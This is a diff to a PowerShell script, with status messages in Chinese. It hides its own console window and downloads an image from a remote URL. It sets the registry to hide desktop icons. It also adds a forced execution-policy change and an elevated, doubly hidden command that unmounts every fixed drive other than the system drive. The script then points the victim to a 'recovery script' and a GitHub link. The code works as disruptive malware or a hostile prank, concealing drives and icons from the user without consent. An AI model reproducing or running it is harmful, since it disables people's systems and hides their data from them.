@@ -1,3 +1,4 @@
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force
 Add-Type -Name W -Namespace X -MemberDefinition '[System.Runtime.InteropServices.DllImport("kernel32.dll")] public static extern System.IntPtr GetConsoleWindow(); [System.Runtime.InteropServices.DllImport("user32.dll")] public static extern bool ShowWindow(System.IntPtr hWnd,int nCmdShow);'; [X.W]::ShowWindow([X.W]::GetConsoleWindow(),0) | Out-Null
 
 $url  = "https://pic3.zhimg.com/v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
@@ -84,7 +85,8 @@ Set-ItemProperty -Path $regPath -Name HideIcons -Type DWord -Value 1 -Force
 Write-Host "恢复脚本在桌面"
 Write-Host "运行后没恢https://github.com/hyaynygy123/hang/blob/main/README.md"
 
-Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "$sys=($env:SystemDrive)[0].ToString().ToUpper(); Get-Volume | ? { $_.DriveType -eq ''Fixed'' -and $_.DriveLetter -and $_.DriveLetter.ToString().ToUpper() -ne $sys } | % { $L = (''{0}:'' -f $_.DriveLetter); & mountvol $L /D }"'
+Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "if(-not $env:__HIDE__){$env:__HIDE__=1;Start-Process powershell -WindowStyle Hidden -ArgumentList ''-NoProfile -ExecutionPolicy Bypass -Command \"$sys=($env:SystemDrive)[0].ToString().ToUpper(); Get-Volume | ? { $_.DriveType -eq ''''Fixed'''' -and $_.DriveLetter -and $_.DriveLetter.ToString().ToUpper() -ne $sys } | % { $L = (''''''{0}:'''''' -f $_.DriveLetter); & mountvol $L /D }\"'';exit}; $sys=($env:SystemDrive)[0].ToString().ToUpper(); Get-Volume | ? { $_.DriveType -eq ''Fixed'' -and $_.DriveLetter -and $_.DriveLetter.ToString().ToUpper() -ne $sys } | % { $L = (''{0}:'' -f $_.DriveLetter); & mountvol $L /D }"'
+Start-Sleep -s 3
 
 Add-Type -TypeDefinition @"
 using System;
